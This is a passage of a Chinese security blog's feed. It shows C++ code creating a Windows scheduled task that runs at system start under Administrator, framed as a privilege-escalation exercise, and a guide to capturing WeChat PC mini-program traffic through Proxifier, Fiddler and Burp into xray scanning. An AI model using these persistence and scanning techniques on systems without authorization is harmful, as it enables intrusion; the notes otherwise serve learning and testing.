class="line">        <span class="comment">// set flag仅在登录时设置</span></span><br><span class="line">        hr = pITask-&gt;SetFlags(TASK_FLAG_RUN_ONLY_IF_LOGGED_ON);</span><br><span class="line">    <span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">    &#123;</span><br><span class="line">        wprintf(<span class="string">L"Failed calling ITask::EditWorkItem, "</span>);</span><br><span class="line">        wprintf(<span class="string">L"error = 0x%x\n"</span>, hr);</span><br><span class="line">        CoUninitialize();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 仅为登录设置用户名</span></span><br><span class="line">    hr = pITask-&gt;SetAccountInformation(<span class="string">L"Administrator"</span>, <span class="literal">NULL</span>); <span class="comment">//L"NT AUTHORITY\\SYSTEM"; </span></span><br><span class="line">    <span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">    &#123;</span><br><span class="line">        wprintf(<span class="string">L"Failed calling ITask::SetApplicationName: "</span>);</span><br><span class="line">        wprintf(<span class="string">L"error = 0x%x\n"</span>, hr);</span><br><span class="line">        pITask-&gt;Release();</span><br><span class="line">        CoUninitialize();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用ITask::CreateTrigger来创建一个新的触发器。</span></span><br><span class="line">    ITaskTrigger* pITaskTrigger;</span><br><span class="line">    WORD piNewTrigger;</span><br><span class="line">    hr = pITask-&gt;CreateTrigger(&amp;piNewTrigger,</span><br><span class="line">        &amp;pITaskTrigger);</span><br><span class="line">    <span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">    &#123;</span><br><span class="line">        wprintf(<span class="string">L"Failed calling ITask::CreatTrigger: "</span>);</span><br><span class="line">        wprintf(<span class="string">L"error = 0x%x\n"</span>, hr);</span><br><span class="line">        pITask-&gt;Release();</span><br><span class="line">        CoUninitialize();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//定义TASK_TRIGGER结构。注意,wBeginDay,</span></span><br><span class="line">    <span class="comment">//wBeginMonth和wBeginYear必须设置为一个有效的</span></span><br><span class="line">    <span class="comment">//分别为日、月、年。</span></span><br><span class="line">    TASK_TRIGGER pTrigger;</span><br><span class="line">    ZeroMemory(&amp;pTrigger, <span class="keyword">sizeof</span>(TASK_TRIGGER));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加代码设置触发器结构?</span></span><br><span class="line">    pTrigger.cbTriggerSize = <span class="keyword">sizeof</span>(TASK_TRIGGER);</span><br><span class="line">    pTrigger.wBeginDay = <span class="number">20</span>;                  <span class="comment">// 必需的</span></span><br><span class="line">    pTrigger.wBeginMonth = <span class="number">1</span>;                <span class="comment">// 必需的</span></span><br><span class="line">    pTrigger.wBeginYear = <span class="number">1997</span>;              <span class="comment">// 必需的</span></span><br><span class="line">    pTrigger.wStartHour = <span class="number">10</span>;</span><br><span class="line">    pTrigger.wStartMinute = <span class="number">10</span>;</span><br><span class="line">    pTrigger.MinutesDuration = <span class="number">600</span>;</span><br><span class="line">    pTrigger.TriggerType = TASK_EVENT_TRIGGER_AT_SYSTEMSTART;   <span class="comment">//TASK_EVENT_TRIGGER_AT_SYSTEMSTART   </span></span><br><span class="line">    pTrigger.Type.Daily.DaysInterval = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用ITaskTrigger::SetTrigger来设置触发条件。  </span></span><br><span class="line">    hr = pITaskTrigger-&gt;SetTrigger(&amp;pTrigger);</span><br><span class="line">    <span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">    &#123;</span><br><span class="line">        wprintf(<span class="string">L"Failed calling ITaskTrigger::SetTrigger: "</span>);</span><br><span class="line">        wprintf(<span class="string">L"error = 0x%x\n"</span>, hr);</span><br><span class="line">        pITask-&gt;Release();</span><br><span class="line">        pITaskTrigger-&gt;Release();</span><br><span class="line">        CoUninitialize();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用IPersistFile::Save将触发器保存到磁盘。  </span></span><br><span class="line">    IPersistFile* pIPersistFile;</span><br><span class="line">    hr = pITask-&gt;QueryInterface(IID_IPersistFile,</span><br><span class="line">        (<span class="keyword">void</span>**)&amp;pIPersistFile);</span><br><span class="line">    hr = pIPersistFile-&gt;Save(<span class="literal">NULL</span>,</span><br><span class="line">        TRUE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">    &#123;</span><br><span class="line">        wprintf(<span class="string">L"Failed calling IPersistFile::Save: "</span>);</span><br><span class="line">        wprintf(<span class="string">L"error = 0x%x\n"</span>, hr);</span><br><span class="line">        pITask-&gt;Release();</span><br><span class="line">        pITaskTrigger-&gt;Release();</span><br><span class="line">        pIPersistFile-&gt;Release();</span><br><span class="line">        CoUninitialize();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    wprintf(<span class="string">L"The trigger was created and IPersistFile::Save was \n"</span>);</span><br><span class="line">    wprintf(<span class="string">L"called to save the new trigger to disk.\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放资源。</span></span><br><span class="line">    pITask-&gt;Release();</span><br><span class="line">    pITaskTrigger-&gt;Release();</span><br><span class="line">    pIPersistFile-&gt;Release();</span><br><span class="line">    CoUninitialize();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Created task.\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>运行后生成job文件</p></blockquote><p>![生成的job文件](jobjpg %}</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://xz.aliyun.com/t/10625?page=1" target="_blank" rel="noopener">关于计划任务的探究</a></p><p><a href="https://blog.csdn.net/yaoxuanzhi/article/details/57562955?ops_request_misc=&request_id=&biz_id=102&utm_term=C++%20Task%20Scheduler%202.0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-57562955.first_rank_v2_pc_rank_v29&spm=1018.2226.3001.4187" target="_blank" rel="noopener">Task Scheduler 2.0的相关操作</a></p><p><a href="https://docs.microsoft.com/zh-cn/windows/win32/taskschd/task-scheduler-2-0-interfaces?redirectedfrom=MSDN" target="_blank" rel="noopener">任务计划程序 2.0 接口</a></p><p><a href="https://www.cnblogs.com/hrhguanli/p/4095448.html" target="_blank" rel="noopener">计划任务中使用NT AUTHORITY\SYSTEM用户和普通管理员用户有什么差别</a></p><p><a href="https://docs.microsoft.com/en-us/windows/win32/taskschd/tasks" target="_blank" rel="noopener">Tasks</a></p><p><a href="https://blog.csdn.net/chantsky/article/details/82904942?spm=1001.2101.3001.6650.5&utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-5.pc_relevant_default&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-5.pc_relevant_default&utm_relevant_index=10" target="_blank" rel="noopener">VC++创建计划任务的若干方式</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;之前在学校的时候打acm用的C++，不过没学过底层的东西。没想到竟然有一天，会拿着C++看算法以外的东西。提到权的那一刻是真爽啊！下面只给了Task Scheduler 2.0的图，其他的图忘记截了&amp;#x3D; &amp;#x3D;&lt;/p&gt;</summary>
    
    
    
    <category term="win" scheme="https://chenzidu.github.io/categories/win/"/>
    
    
    <category term="C++" scheme="https://chenzidu.github.io/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>微信pc公众号及微信小程序抓取数据包</title>
    <link href="https://chenzidu.github.io/2021/11/22/%E5%BE%AE%E4%BF%A1pc%E5%85%AC%E4%BC%97%E5%8F%B7%E5%8F%8A%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8F%96%E6%95%B0%E6%8D%AE%E5%8C%85/"/>
    <id>https://chenzidu.github.io/2021/11/22/%E5%BE%AE%E4%BF%A1pc%E5%85%AC%E4%BC%97%E5%8F%B7%E5%8F%8A%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8F%96%E6%95%B0%E6%8D%AE%E5%8C%85/</id>
    <published>2021-11-22T01:01:48.000Z</published>
    <updated>2024-03-11T07:48:09.653Z</updated>
    
    <content type="html"><![CDATA[<p>总结以下微信的数据包抓取，免得忘记了。主要是针对微信PC端的小程序，以及微信PC的公众号抓取。利用了burp + proxifier + fiddler,xray 在开启被动扫描，burp流量转发至burp，自动扫描。</p><a id="more"></a><h1 id="微信小程序数据包抓取"><a href="#微信小程序数据包抓取" class="headerlink" title="微信小程序数据包抓取"></a>微信小程序数据包抓取</h1><p>整体思路：1、利用proxifier抓取微信小程序exe，流量转发至burp</p><p>![WeChatApp](WeChatAppjpg %}</p><p>proxifier配置Servers，设置127.0.0.1:8080的https和http</p><p>![proxifierServers配置](proxifierServersjpg %}</p><p>proxifier配置Rules将wechatapp.exe; wechatapplauncher.exe进行监听，基本上只会用到wechatapp，我看另一个也是app所以一起监听了，以防万一</p><p>![proxifierRules](proxifierRulesjpg %}</p><p>打开去哪儿，发现数据包抓取成功，proxifier将数据抓取</p><p>![wechatapp数据包抓取](wechatprojpg %}</p><p>proxifier将数据传至burp获取数据包，成功抓取小程序数据。</p><p>![wechatburp数据包抓取.jpg](wechatburpjpg %}</p><h1 id="微信公众号数据包抓取"><a href="#微信公众号数据包抓取" class="headerlink" title="微信公众号数据包抓取"></a>微信公众号数据包抓取</h1><p>配置Fiddler web，配置8888端口，再配置gateway配置代理：127.0.0.1:8080</p><p>![Fiddler配置](Fiddlerjpg %}</p><p>成功配置后点击show current gateway info,测试是否相通</p><p>![Fiddlergateway](Fiddlergatewayjpg %}</p><p>burp成功获得数据包</p><p>![burp数据](burpfiddlerjpg %}</p><h1 id="xray配置扫描"><a href="#xray配置扫描" class="headerlink" title="xray配置扫描"></a>xray配置扫描</h1><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./xray_windows_amd64.exe webscan --listen <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8989</span> --html-output test.html</span><br></pre></td></tr></table></figure><p>burp配置上层代理规则，将流量转发至xray进行被动扫描</p><p>![burp配置上层代理](burpxrayjpg %}</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;总结以下微信的数据包抓取，免得忘记了。主要是针对微信PC端的小程序，以及微信PC的公众号抓取。利用了burp + proxifier + fiddler,xray 在开启被动扫描，burp流量转发至burp，自动扫描。&lt;/p&gt;</summary>
    
    
    
    <category term="数据包抓取" scheme="https://chenzidu.github.io/categories/%E6%95%B0%E6%8D%AE%E5%8C%85%E6%8A%93%E5%8F%96/"/>
    
    
    <category term="WEB" scheme="https://chenzidu.github.io/tags/WEB/"/>
    
  </entry>
  
</feed>
